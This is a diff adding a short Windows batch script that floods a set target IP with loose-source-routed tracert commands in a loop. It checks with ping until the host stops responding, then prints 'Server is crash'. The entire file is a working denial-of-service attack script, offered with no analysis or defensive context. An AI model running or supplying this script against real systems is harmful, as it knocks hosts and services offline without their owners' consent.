@@ -1,0 +1,14 @@
+Set targetip=192.168.146.128
+:1
+tracert -h 1 -j 0.0.0.0 %targetip%
+tracert -h 1 -j 0.0.0.0 %targetip%
+tracert -h 1 -j 0.0.0.0 %targetip%
+tracert -h 1 -j 0.0.0.0 %targetip%
+tracert -h 1 -j 0.0.0.0 %targetip%
+ping %targetip% -n 1 || goto end
+goto 1
+:end
+@cls
+@Echo Server is crash
+@pause
+exit 
